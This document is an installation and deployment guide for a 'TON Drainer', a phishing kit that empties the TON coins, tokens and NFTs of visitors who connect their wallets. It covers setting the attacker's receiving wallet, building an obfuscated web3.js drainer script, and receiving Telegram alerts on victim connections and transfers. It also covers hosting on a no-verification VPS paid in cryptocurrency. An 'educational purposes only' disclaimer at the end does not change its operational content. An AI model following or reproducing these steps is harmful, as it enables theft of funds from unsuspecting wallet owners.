# TON Drainer Installation Guide

## Overview  
This guide walks you through the installation process for **TON Drainer**. Follow the steps below to set up your local environment, configure your server, and deploy the drainer script.  

---

## -> 1. Local Installation (dependencies)

### Step 1: Unpack the Script  
1. Extract the provided archive to any folder on your computer.  
2. The location doesn’t matter—choose what’s convenient.  

### Step 2: Install Node.js 
The script requires **Node.js** Install it based on your operating system:  

#### depending on your OS you can install node.js in different ways.

#### Windows
1. Download the latest version from [nodejs.org](https://nodejs.org/).  
2. Run the installer and follow the setup instructions.  
3. Open **Command Prompt (cmd)** and verify the installation:  
```bash
   node -v && npm -v
```
#### Mac
1.	Install Homebrew if you haven’t already:
```bash
   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```
2.	Install Node.js via Homebrew:
```bash
   brew install node
```
3.	Verify the installation:
```bash
   node -v && npm -v
```


## -> 2. Drainer Configuration

### Step 1: Modify Configuration Files

1. Navigate to the folder and open a command terminal. 
```bash
   cd /folder/with/the/script
```

2. Install the node dependencies with **npm install**.
```bash
   npm install
```

3. Customize the **CF** variables in the **build.js** file to align with your setup:


```bash
const CF = {
  Wallet: "Your Wallet Address", 
}
```

- *Wallet -> Your Wallet Address*
- *Native -> 'true'  Drain Native TON Coins*
- *Tokens -> 'true'  Drain Tokens USDT, NOT, etc.*
- *NFTs -> 'true'  Drain NFTs*
- *Tokens_First -> 'false' - start draining with the best value price / 'true' - Token are always first*
- *Ton_rate -> conversion rate ( 1 TON to USD = 3.99 )*
- *TonApi_Key -> leave empty or get a key from https://tonconsole.com/*
- *manifestUrl -> To use a personalized manifest, use « 'https://' + window.location.hostname + '/tonconnect-manifest.json' »*

(Optionally) update the **TG** variables to enable notifications (refer to the TelegramBot setup below).

### Step 2: Build and Run the Script
*Build the script generate the obfuscated **web3.js** file wich contain drainer logic and your wallet address.*

1.	Navigate to the folder and open a command terminal. 
```bash
   cd /folder/with/the/script
```

2. Run the build script **node build.js**
```bash
   npm run start
```


### Step 3 (Optional): Telegram Bot Notifications
by default notifications are disabled so the script will work silently without any notifications you can enable them by editing the **TG** variables in the **build.js** file.

#### Step 1: Create a Telegram Bot
1.	Use @BotFather on Telegram to create a bot.
2.	Copy the API token provided.

#### Step 2: Add the Bot to a Conversation
1.	Create a group or private chat.
2.	Add the bot to the chat.

#### Step 3: Retrieve the Chat ID
1.	Forward a message from the chat to @userinfobot.
2.	The bot will reply with the Chat ID.

#### Step 4: Edit build.js

1. Customize the **TG** variables in the **build.js** file to align with your setup:
```bash
const TG = {
	token: "725766552:ABChbSGObfvqkdxX4OEhZ_Hb8_V6...", 
	chat_id: "-1033337653...", 
};
```
*Notifications can be enabled or disabled by changing the value to 'true' or 'false'.*

- *enter_website: true -> Notify on site entry*
- *connect_success: true -> Notify on wallet connection*
- *connect_empty: true -> Notify on empty wallet connection*
- *transfer_request: true -> Notify on transfer request*
- *transfer_success: true -> Notify on successful transfer*
- *transfer_cancel: true -> Notify on declined transfer*

### Step 4: Build and Run the Script
*Build the script generate the obfuscated **web3.js** file wich contain drainer logic with notifications and your wallet address.*

1.	Navigate to the folder and open a command terminal. 
```bash
   cd /folder/with/the/script
```

2. Run the build script **node build.js**
```bash
   npm run start
```

## -> 3. Hosting on a Local Server

1.	Copy all files from the **/build** folder to **/www** folder of your local server.
2.	Open the **/index.html** file in your browser.
3.	Congratulation Drainer is running on your local server.


## -> 4. Hosting on a Remote Server

### Step 1: Rent a VPS Server

To ensure compatibility, use Ubuntu 20.04 as the operating system. You can rent a VPS from providers like 4VPS, which supports cryptocurrency payments and requires no verification.

1.	Create an Account on 4VPS
-	Visit 4VPS and log in or register.
-	Top up your balance using cryptocurrency (e.g., 1000 RUB for optimal servers).
2.	Rent a Server
-	Choose a server location (avoid Russia and CIS regions).
-	Select a server type (e.g., XXX-cx21 for optimal performance).
-	Set the OS to Ubuntu 20.04 (don’t select any pre-installed recipes).
3.	Access Server Details
-	Once the server is activated, retrieve the IP address, username (root), and password from the server control panel.

### Step 2: Connect to the Server & Install Dependencies
1.	On your Windows PC, open PowerShell as an administrator.
2.	Connect to the server using:
```bash
   ssh root@SERVER_IP
```
Replace SERVER_IP with the actual server IP.

3.	Enter the server password when prompted.
4.	Install necessary dependencies:
```bash
   sudo apt-get update && sudo apt-get upgrade  
   sudo apt install curl  
   curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash  
   source ~/.bashrc  
   nvm install --lts 
```
Verify the installation:
```bash
   node -v && npm -v  
```


### Step 3: Upload Files to the Server
1.	Download and install FileZilla or any other FTP client.
2.	Connect to the server using:
```bash
   Host: sftp://SERVER_IP
   Username: root
   Password: Server password.
```
3.	Navigate to /root folder
4.	Upload all files from the unpacked drainer archive in the root directory. 
5.	Reapeat **step -> 2. Drainer Configuration** from the previous steps.
6.	Connect your domain to the build folder.

-

# 🛑 Warning / Disclaimer 🛑

⚠️ **Warning!** This repository contains code for **educational and research purposes only**. Any use of this code for illegal or malicious activities is strictly prohibited.  

The goal of this project is to explore and analyze the mechanisms of malicious software to better understand how they work and to strengthen cybersecurity. It is intended for security researchers, students, and cybersecurity enthusiasts.


⚠️ The author **cannot be held responsible** for any misuse or illegal activities involving this code.  

⚠️ Using this code on systems without explicit authorization is **illegal** and may result in **criminal charges**.

- Use this code **only** in an isolated test environment (virtual machine, sandbox, etc.).
- Do not run this code on production systems or systems belonging to third parties.
- Always comply with applicable cybersecurity laws and regulations.